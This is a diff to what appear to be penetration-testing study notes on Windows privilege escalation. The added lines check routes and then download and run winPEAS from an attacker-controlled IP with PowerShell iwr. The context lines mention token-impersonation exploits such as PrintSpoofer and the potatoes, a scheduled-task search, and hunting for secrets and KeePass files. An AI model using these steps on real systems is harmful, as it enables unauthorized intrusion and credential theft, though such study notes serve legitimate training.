@@ -173,7 +173,14 @@ run -j
 
 ### Windows privesc
 - check if access to internal network
+```bash
+ip route
+```
 - run winpeas for initial overview of system
+```bash
+iwr -uri http://192.168.45.242:8000/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+```
 - look for Se privs
 	- if impersonate, try to use printSpoofer or one of the potatos
 ```bash
@@ -260,7 +267,7 @@ schtasks /query /fo LIST /v
 schtasks.exe /query /V /FO CSV | convertfrom-csv | where{$_.'Run as user' -match 'roy'} | select taskname
 ```
 - check powershell history for secrets
-- check for presence of keepass and .kdbx files
+- check for presence of .kdbx files
 - identify if there are any internal web services - always check default admin creds
 - note there may be AV protection blocking our scripts
 
